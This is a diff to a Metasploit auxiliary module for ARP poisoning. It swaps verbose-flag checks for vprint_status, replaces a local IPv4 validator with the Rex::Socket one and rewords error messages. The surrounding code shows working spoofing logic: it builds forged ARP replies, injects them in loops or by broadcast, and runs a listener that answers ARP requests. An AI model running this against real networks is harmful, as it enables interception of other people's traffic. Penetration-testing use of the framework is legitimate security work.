@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -42,7 +42,7 @@ class Metasploit3 < Msf::Auxiliary
 			OptString.new('INTERFACE', 	[false, 'The name of the interface']),
 			OptBool.new(  'BIDIRECTIONAL',	[true, 'Spoof also the source with the dest',false]),
 			OptBool.new(  'AUTO_ADD',	[true, 'Auto add new host when discovered by the listener',false]),
-			OptBool.new(  'VERBOSE',	[true, 'Display more output on screen',false]),
+			#OptBool.new(  'VERBOSE',	[true, 'Display more output on screen',false]),
 			OptBool.new(  'LISTENER',    	[true, 'Use an additionnal thread that will listen to arp request and try to relply as fast as possible', true])
 		], self.class)
 
@@ -83,20 +83,20 @@ class Metasploit3 < Msf::Auxiliary
 			@interface = get_interface_guid(@interface)
 			@smac = datastore['SMAC']
 			@smac ||= get_mac(@interface) if @netifaces
-			raise RuntimeError ,'Source Mac should be defined' unless @smac
-			raise RuntimeError ,'Source Mac is not in correct format' unless is_mac?(@smac)
+			raise RuntimeError ,'SMAC is not defined and can not be guessed' unless @smac
+			raise RuntimeError ,'Source MAC is not in correct format' unless is_mac?(@smac)
 
 			@sip = datastore['LOCALSIP']
 			@sip ||= Pcap.lookupaddrs(@interface)[0] if @netifaces
-			raise "LOCALIP is not defined and can not be guessed" unless @sip
-			raise "LOCALIP is not an ipv4 address" unless is_ipv4? @sip
+			raise "LOCALSIP is not defined and can not be guessed" unless @sip
+			raise "LOCALSIP is not an ipv4 address" unless Rex::Socket.is_ipv4?(@sip)
 
 			shosts_range  = Rex::Socket::RangeWalker.new(datastore['SHOSTS'])
 			@shosts = []
 			if datastore['BIDIRECTIONAL']
-				shosts_range.each{|shost| if is_ipv4? shost and shost != @sip then @shosts.push shost end}
+				shosts_range.each{|shost| if Rex::Socket.is_ipv4?(shost) and shost != @sip then @shosts.push shost end}
 			else
-				shosts_range.each{|shost| if is_ipv4? shost then @shosts.push shost end}
+				shosts_range.each{|shost| if Rex::Socket.is_ipv4?(shost) then @shosts.push shost end}
 			end
 
 			if datastore['BROADCAST']
@@ -123,7 +123,7 @@ class Metasploit3 < Msf::Auxiliary
 							@srchosts_cache.keys.sort.each do |shost|
 								smac = @srchosts_cache[shost]
 								if shost != dhost
-									print_status("Sending arp packet for #{shost} to #{dhost}") if datastore['VERBOSE']
+									vprint_status("Sending arp packet for #{shost} to #{dhost}")
 									reply = buildreply(shost, smac, dhost, dmac)
 									inject(reply)
 									Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
@@ -132,7 +132,7 @@ class Metasploit3 < Msf::Auxiliary
 						else
 							@shosts.each do |shost|
 								if shost != dhost
-									print_status("Sending arp request for #{shost} to #{dhost}") if datastore['VERBOSE']
+									vprint_status("Sending arp request for #{shost} to #{dhost}")
 									request = buildprobe(dhost, dmac, shost)
 									inject(request)
 									Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
@@ -146,7 +146,7 @@ class Metasploit3 < Msf::Auxiliary
 							@dsthosts_cache.keys.sort.each do |dhost|
 								dmac = @dsthosts_cache[dhost]
 								if shost != dhost
-									print_status("Sending arp packet for #{dhost} to #{shost}") if datastore['VERBOSE']
+									vprint_status("Sending arp packet for #{dhost} to #{shost}")
 									reply = buildreply(dhost, dmac, shost, smac)
 									inject(reply)
 									Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
@@ -164,7 +164,7 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("ARP poisoning in progress (broadcast)...")
 		while(true)
 			@shosts.each do |shost|
-				print_status("Sending arp packet for #{shost} address") if datastore['VERBOSE']
+				vprint_status("Sending arp packet for #{shost} address")
 				reply = buildreply(shost, @smac, '0.0.0.0', 'ff:ff:ff:ff:ff:ff')
 				inject(reply)
 				Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
@@ -178,14 +178,13 @@ class Metasploit3 < Msf::Auxiliary
 
 		dhosts_range = Rex::Socket::RangeWalker.new(datastore['DHOSTS'])
 		@dhosts = []
-		dhosts_range.each{|dhost| if is_ipv4? dhost and dhost != @sip then @dhosts.push(dhost) end}
+		dhosts_range.each{|dhost| if Rex::Socket.is_ipv4?(dhost) and dhost != @sip then @dhosts.push(dhost) end}
 
 		#Build the local dest hosts cache
 		print_status("Building the destination hosts cache...")
 		@dhosts.each do |dhost|
-			if datastore['VERBOSE']
-				print_status("Sending arp packet to #{dhost}")
-			end
+			vprint_status("Sending arp packet to #{dhost}")
+
 			probe = buildprobe(@sip, lsmac, dhost)
 			inject(probe)
 			while(reply = getreply())
@@ -219,15 +218,11 @@ class Metasploit3 < Msf::Auxiliary
 			print_status("Building the source hosts cache for unknow source hosts...")
 			@shosts.each do |shost|
 				if @dsthosts_cache.has_key? shost
-					if datastore['VERBOSE']
-						print_status("Adding #{shost} from destination cache")
-					end
+					vprint_status("Adding #{shost} from destination cache")
 					@srchosts_cache[shost] = @dsthosts_cache[shost]
 					next
 				end
-				if datastore['VERBOSE']
-					print_status("Sending arp packet to #{shost}")
-				end
+				vprint_status("Sending arp packet to #{shost}")
 				probe = buildprobe(@sip, lsmac, shost)
 				inject(probe)
 				while(reply = getreply())
@@ -288,7 +283,7 @@ class Metasploit3 < Msf::Auxiliary
 					@srchosts_cache.keys.sort.each do |shost|
 						smac = @srchosts_cache[shost]
 						if shost != dhost
-							print_status("Sending arp packet for #{shost} to #{dhost}") if datastore['VERBOSE']
+							vprint_status("Sending arp packet for #{shost} to #{dhost}")
 							reply = buildreply(shost, @smac, dhost, dmac)
 							inject(reply)
 							Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
@@ -297,7 +292,7 @@ class Metasploit3 < Msf::Auxiliary
 				else
 					@shosts.each do |shost|
 						if shost != dhost
-							print_status("Sending arp packet for #{shost} to #{dhost}") if datastore['VERBOSE']
+							vprint_status("Sending arp packet for #{shost} to #{dhost}")
 							reply = buildreply(shost, @smac, dhost, dmac)
 							inject(reply)
 							Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
@@ -312,7 +307,7 @@ class Metasploit3 < Msf::Auxiliary
 					@dsthosts_cache.keys.sort.each do |dhost|
 						dmac = @dsthosts_cache[dhost]
 						if shost != dhost
-							print_status("Sending arp packet for #{dhost} to #{shost}") if datastore['VERBOSE']
+							vprint_status("Sending arp packet for #{dhost} to #{shost}")
 							reply = buildreply(dhost, @smac, shost, smac)
 							inject(reply)
 							Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
@@ -327,12 +322,6 @@ class Metasploit3 < Msf::Auxiliary
 	def is_mac?(mac)
 		if mac =~ /^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$/ then true
 		else false end
-	end
-
-	#copy paste from rex::socket cause we need only ipv4
-	#NOTE: Breaks msftidy's rule on long lines, should be refactored for readability.
-	def is_ipv4?(addr)
-		(addr =~ /^(?:(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})[.](?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})[.](?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})[.](?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2}))$/) ? true : false
 	end
 
 	def buildprobe(shost, smac, dhost)
@@ -402,7 +391,7 @@ class Metasploit3 < Msf::Auxiliary
 								#check if the source ip is in the dest hosts
 								if (liste_dst_ips.include? pkt.arp_saddr_ip and liste_src_ips.include? pkt.arp_daddr_ip) or
 									(args[:BIDIRECTIONAL] and liste_dst_ips.include? pkt.arp_daddr_ip and liste_src_ips.include? pkt.arp_saddr_ip)
-									print_status("Listener : Request from #{pkt.arp_saddr_ip} for #{pkt.arp_daddr_ip}") if datastore['VERBOSE']
+									vprint_status("Listener : Request from #{pkt.arp_saddr_ip} for #{pkt.arp_daddr_ip}")
 									reply = buildreply(pkt.arp_daddr_ip, @smac, pkt.arp_saddr_ip, pkt.eth_saddr)
 									3.times{listener_capture.inject(reply.to_s)}
 								elsif args[:AUTO_ADD]
